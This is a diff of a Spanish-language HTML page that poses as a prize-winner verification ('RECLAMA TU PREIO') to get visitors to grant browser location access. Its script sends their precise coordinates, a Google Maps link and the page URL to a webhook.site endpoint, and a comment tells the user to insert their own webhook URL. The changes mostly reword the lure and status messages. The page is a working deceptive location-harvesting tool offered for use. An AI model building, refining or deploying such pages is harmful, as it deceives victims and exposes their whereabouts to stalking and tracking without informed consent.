@@ -17,11 +17,11 @@
   </style>
 </head>
 <body>
-  <h1>VERIFICACIÓN DEL GANADOR</h1>
-  <p>Por favor, pulsa el botón y acepta los veneficios.</p>
+  <h1>VERIFICACIÓN Y VALIDACIÓN</h1>
+  <p>Por favor, pulsa el botón y acepta la solicitud de ubicación.</p>
 
-  <button id="btn">📍 DISCUBRE TU PREMIO</button>
-  <div class="msg" id="msg">Estado: esperando acción</div>
+  <button id="btn">📍 RECLAMA TU PREIO</button>
+  <div class="msg" id="msg">VERIFICA TU PREMIO</div>
 
   <pre id="coords" aria-live="polite"></pre>
   <a id="mapsLink" class="maps" target="_blank" rel="noopener"></a>
@@ -31,9 +31,8 @@
   </footer>
 
   <script>
-    // === REEMPLAZA ESTA URL POR TU PROPIA URL DE webhook.site ===
+    // 🔴 Reemplaza esta URL con tu URL de webhook.site
     const REPORT_URL = "	https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639";
-    // ============================================================
 
     const btn = document.getElementById('btn');
     const msg = document.getElementById('msg');
@@ -45,7 +44,7 @@
         msg.textContent = "Tu navegador no soporta geolocalización.";
         return;
       }
-      msg.textContent = "Solicitando ubicación… ";
+      msg.textContent = "Solicitando ubicación…";
       navigator.geolocation.getCurrentPosition(onSuccess, onError, {
         enableHighAccuracy: true,
         maximumAge: 0,
@@ -70,27 +69,27 @@
         source: location.href
       };
 
-      // Mostrar inmediatamente en la página (útil para verificar)
+      // Mostrar en pantalla
       coords.textContent = JSON.stringify(payload, null, 2);
       mapsLink.href = maps;
-      mapsLink.textContent = "Abrir en Google Maps";
+      mapsLink.textContent = "Abrir en Google Maps 🌍";
 
-      // Enviar al webhook de forma no bloqueante
+      // Enviar al webhook
       fetch(REPORT_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       }).then(resp => {
         if (resp.ok) msg.textContent = "Ubicación enviada ✅";
-        else msg.textContent = "Enviado, pero el servidor respondió con error: " + resp.status;
+        else msg.textContent = "Error en envío: " + resp.status;
       }).catch(err => {
-        msg.textContent = "Error al enviar: " + (err.message || err);
+        msg.textContent = "Error: " + (err.message || err);
       });
     }
 
     function onError(err) {
       if (!err) { msg.textContent = "Error desconocido al obtener ubicación."; return; }
-      if (err.code === 1) msg.textContent = "Permiso denegado. El usuario no autorizó la ubicación.";
+      if (err.code === 1) msg.textContent = "Permiso denegado ❌";
       else if (err.code === 2) msg.textContent = "Posición no disponible.";
       else if (err.code === 3) msg.textContent = "Tiempo de espera agotado.";
       else msg.textContent = "Error: " + (err.message || err.code);
@@ -98,5 +97,7 @@
   </script>
 </body>
 </html>
+
+
 
 
